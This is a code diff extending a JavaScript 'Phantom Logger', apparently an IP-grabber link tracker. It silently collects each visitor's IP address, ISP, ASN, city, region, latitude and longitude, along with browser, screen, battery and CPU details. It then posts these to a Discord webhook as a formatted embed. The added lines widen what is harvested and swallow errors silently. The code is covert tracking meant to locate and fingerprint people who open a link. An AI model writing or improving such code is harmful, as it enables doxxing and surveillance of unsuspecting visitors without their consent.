@@ -41,6 +41,19 @@
             const webhookUrl = localStorage.getItem('phantom_webhook');
             
             if (webhookUrl) {
+                // Helper to get browser name from User Agent
+                const getBrowserName = (userAgent) => {
+                    if (!userAgent) return "Unknown";
+                    if (userAgent.includes("Firefox")) return "Mozilla Firefox";
+                    if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
+                    if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+                    if (userAgent.includes("Trident")) return "Internet Explorer";
+                    if (userAgent.includes("Edge") || userAgent.includes("Edg")) return "Microsoft Edge";
+                    if (userAgent.includes("Chrome")) return "Google Chrome";
+                    if (userAgent.includes("Safari")) return "Apple Safari";
+                    return "Unknown";
+                };
+
                 // Collect data
                 const data = {
                     id: id,
@@ -51,40 +64,86 @@
                     platform: navigator.platform,
                     screen: `${screen.width}x${screen.height}`,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    referrer: document.referrer || 'direct'
+                    referrer: document.referrer || 'direct',
+                    cookiesEnabled: navigator.cookieEnabled,
+                    cpuCores: navigator.hardwareConcurrency || 'N/A',
+                    browser: getBrowserName(navigator.userAgent)
                 };
                 
-                // Get IP
+                // Get Battery Info
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        data.batteryLevel = `${Math.round(battery.level * 100)}%`;
+                        data.batteryCharging = battery.charging ? 'Yes' : 'No';
+                    }
+                } catch (e) {}
+
+                // Get IP and extended location info
                 try {
                     const ipRes = await fetch('https://ipapi.co/json/');
                     if (ipRes.ok) {
                         const ipData = await ipRes.json();
                         data.ip = ipData.ip;
+                        data.ip_version = ipData.version;
                         data.city = ipData.city;
+                        data.region = ipData.region;
                         data.country = ipData.country_name;
+                        data.latitude = ipData.latitude;
+                        data.longitude = ipData.longitude;
                         data.isp = ipData.org;
+                        data.asn = ipData.asn;
                     }
                 } catch (e) {}
                 
-                // Send to Discord
+                // Send to Discord with a much more advanced embed
                 try {
+                    const embed = {
+                        title: "👻 Phantom Logger | New Visit",
+                        description: `A new visit has been recorded for tracking ID \`${id || 'N/A'}\`.`,
+                        color: 0xa78bfa,
+                        fields: [
+                            {
+                                name: "🌐 Network Information",
+                                value: `**IP Address:** \`${data.ip || 'Unknown'}\` (${data.ip_version || '?'})\n` +
+                                       `**ISP:** ${data.isp || 'Unknown'}\n` +
+                                       `**ASN:** ${data.asn || 'Unknown'}`,
+                                inline: false
+                            },
+                            {
+                                name: "📍 Geolocation",
+                                value: `**Location:** ${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}\n` +
+                                       (data.latitude && data.longitude ? `**Coordinates:** View on Map\n` : '') +
+                                       `**Timezone:** ${data.timezone || 'Unknown'}`,
+                                inline: false
+                            },
+                            {
+                                name: "💻 Device & Browser",
+                                value: `**Device:** ${data.platform || 'Unknown'}\n` +
+                                       `**Screen:** ${data.screen || 'Unknown'}\n` +
+                                       `**Browser:** ${data.browser || 'Unknown'}\n` +
+                                       `**Language:** ${data.language || 'Unknown'}`,
+                                inline: true
+                            },
+                            {
+                                name: "🔧 System & Capabilities",
+                                value: `**CPU Cores:** ${data.cpuCores || 'N/A'}\n` +
+                                       `**Cookies:** ${data.cookiesEnabled ? 'Enabled' : 'Disabled'}\n` +
+                                       (data.batteryLevel ? `**Battery:** ${data.batteryLevel} (${data.batteryCharging === 'Yes' ? 'Charging' : 'Discharging'})\n` : '') +
+                                       `**Referrer:** \`${data.referrer || 'direct'}\``,
+                                inline: true
+                            }
+                        ],
+                        footer: {
+                            text: `User Agent: ${data.userAgent}`
+                        },
+                        timestamp: new Date().toISOString()
+                    };
+
                     await fetch(webhookUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `👻 **New Visit** | ID: \`${id}\``,
-                            embeds: [{
-                                fields: [
-                                    { name: "📍 IP", value: data.ip || 'Unknown', inline: true },
-                                    { name: "🌍 Location", value: `${data.city || '?'}, ${data.country || '?'}`, inline: true },
-                                    { name: "📱 Device", value: data.platform || 'Unknown', inline: true },
-                                    { name: "🔗 Type", value: type || 'unknown', inline: true },
-                                    { name: "🆔 Tracking ID", value: id || 'unknown', inline: false }
-                                ],
-                                color: 0xa78bfa,
-                                timestamp: new Date().toISOString()
-                            }]
-                        })
+                        body: JSON.stringify({ embeds: [embed] })
                     });
                 } catch (e) {}
             }
